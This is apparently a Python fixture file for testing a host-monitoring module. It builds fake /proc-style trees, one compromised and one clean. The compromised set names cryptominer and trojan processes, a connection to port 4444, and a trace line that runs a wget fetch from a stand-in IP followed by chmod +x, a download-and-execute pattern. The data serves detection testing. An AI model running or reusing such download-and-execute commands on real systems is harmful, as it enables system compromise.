"""/proc-like fixture trees for the kernel-watch module.

Layout (flat, readable tree):
  identity         host IP for this "endpoint" (RFC 5737)
  ps               `PID COMM` process table
  sockets          local_addr remote_addr uid pid state  (net-style table)
  trace_events     `<epoch> <event> <description>` trace-point sim events
"""
from __future__ import annotations

import os
from typing import Optional


def _net_addr_hex(ip: str, port: int) -> str:
    """/proc/net-style hex32 (little-endian dotted-quad) + hex port."""
    octets = [int(x) for x in ip.split(".")]
    packed = int.from_bytes(bytes(octets), "little")
    return f"{packed:08X}:{port:04X}"


def _write(dirpath: str, name: str, content: str) -> str:
    os.makedirs(dirpath, exist_ok=True)
    path = os.path.join(dirpath, name)
    with open(path, "w", encoding="utf-8") as fh:
        fh.write(content)
    return path


_FIXTURE_PS = """\
1 systemd
523 sshd
800 crond
2144 xmrig
3199 kdevtmpfsi
4122 /tmp/trojan_agent
9001 cgminer
1024 postfix
"""

_FIXTURE_SOCKETS = """\
420200C0:C350 096433C6:115C 1000 2144 01
00000000:7A69 00000000:0000 0 31337 0A
0100007F:0016 00000000:0000 0 523 0A
0100007F:C350 0100007F:0016 1000 800 01
"""

_FIXTURE_TRACES = """\
1700000100 execve /bin/sh -c wget http://198.51.100.50/x && chmod +x /tmp/x
1700000102 connect 198.51.100.60 4444
1700000105 execve /usr/bin/python3 -c import socket
1700000108 socket AF_INET SOCK_RAW
1700000110 execve /bin/true
"""

_CLEAN_PS = """\
1 systemd
523 sshd
800 crond
1024 postfix
2000 python3
"""

_CLEAN_SOCKETS = """\
0100007F:0016 00000000:0000 0 523 0A
0100007F:C350 0100007F:0016 1000 800 01
0100007F:03E9 00000000:0000 0 2000 0A
"""

_CLEAN_TRACES = """\
1700000100 execve /usr/bin/sshd -D
1700000102 connect 198.51.100.53 53
1700000105 execve /usr/bin/python3 -V
1700000110 socket AF_INET SOCK_STREAM
"""


def build_proc_tree(root: str, host_ip: str = "192.0.2.66",
                    bad: Optional[dict] = None) -> str:
    bad = bad or {}
    os.makedirs(root, exist_ok=True)
    _write(root, "identity", f"{host_ip}\n")
    ps = bad.get("ps", _FIXTURE_PS)
    _write(root, "ps", ps)
    _write(root, "sockets", bad.get("sockets", _FIXTURE_SOCKETS))
    _write(root, "trace_events", bad.get("traces", _FIXTURE_TRACES))
    return root


def build_clean_proc_tree(root: str, host_ip: str = "192.0.2.66") -> str:
    os.makedirs(root, exist_ok=True)
    _write(root, "identity", f"{host_ip}\n")
    _write(root, "ps", _CLEAN_PS)
    _write(root, "sockets", _CLEAN_SOCKETS)
    _write(root, "trace_events", _CLEAN_TRACES)
    return root